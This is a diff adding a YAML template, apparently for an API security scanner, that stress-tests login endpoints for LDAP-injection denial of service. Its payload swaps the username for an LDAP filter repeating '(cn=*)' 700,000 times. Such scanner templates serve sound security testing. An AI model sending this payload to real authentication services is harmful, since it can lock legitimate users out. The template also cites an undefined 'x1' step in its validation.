@@ -1,0 +1,90 @@
+id: LDAP_LOGIN_DOS
+info:
+  name: "Denial of Service on  LDAP Login endpoint stress test"
+  description: "In a Denial of Service (DoS) stress test on a LDAP login endpoint, 
+  the endpoint is provided with a special input that causes the endpoint to lag. This aims 
+  to evaluate the endpoint's resilience under heavy load and assess its ability 
+  to authenticate users efficiently. By simulating such attacks, testers 
+  identify potential weaknesses in the LDAP login mechanism, enabling 
+  proactive measures to bolster the system's defenses against DoS attacks targeting authentication services."
+  details: "In this Denial of Service (DoS) stress test on an LDAP login endpoint, testers 
+  intentionally provide the endpoint with a specially crafted input designed to 
+  induce lag. This evaluates the endpoint's performance under heavy load and its 
+  capacity to efficiently authenticate users despite disruptions. By simulating 
+  these attacks, vulnerabilities in the LDAP login mechanism are uncovered, 
+  empowering proactive measures to strengthen the system's defenses 
+  against DoS attacks targeting authentication services."
+  impact: "The impact of a successful Denial of Service (DoS) stress test on a 
+  LDAP login endpoint can be significant. Introducing lag-inducing inputs 
+  may cause delays in user authentication, leading to decreased system 
+  responsiveness and potential service interruptions. Additionally, 
+  prolonged login times or failures can frustrate users, erode trust 
+  in the system, and result in reputational damage for the organization, 
+  emphasizing the importance of fortifying defenses against such attacks."
+  category:
+    name: RL
+    shortName: Lack of Resources & Rate Limiting
+    displayName: Lack of Resources & Rate Limiting (RL)
+  subCategory: LDAP_LOGIN_DOS
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa4-lack-of-resources-and-rate-limiting.md#scenario-2"
+  cwe:
+    - CWE-400
+  cve:
+    - CVE-2023-4647
+    - CVE-2023-38254
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    not_contains_either:
+      - GET
+  url:
+    contains_either:
+      - login
+      - signin
+      - authenticate
+      - auth
+  and:
+    - request_payload:
+        for_one:
+          key:
+            regex: "^username$|^user$|^userid$|^user_id$|^login$|^login_id$|^email$|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
+            extract: userKey
+    - request_payload:
+        for_one:
+          key:
+            regex: "^password$|^pass$|^pwd$|^user_password$|^userpass$|^passwd$|^user_pwd$|^password1$|^userPass$|^login_password$|^loginpassword$|^user_pass$|^access_password$|^secret$|^user_secret$"
+            extract: passKey
+
+execute:
+  type: multiple
+  requests:
+  - req:
+    - add_header:
+        dummy_Header_Key: "dummyValue"
+    - validate:
+        percentage_match:
+          gte: 90
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+         userKey: "*)\" + \"(cn=*)\"*700000 + \"(cn=*"
+    - validate:
+        response_code:
+          gt: 505
+validate:
+  and:
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - 3001
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - ${x1.response.stats.median_response_time} * 3
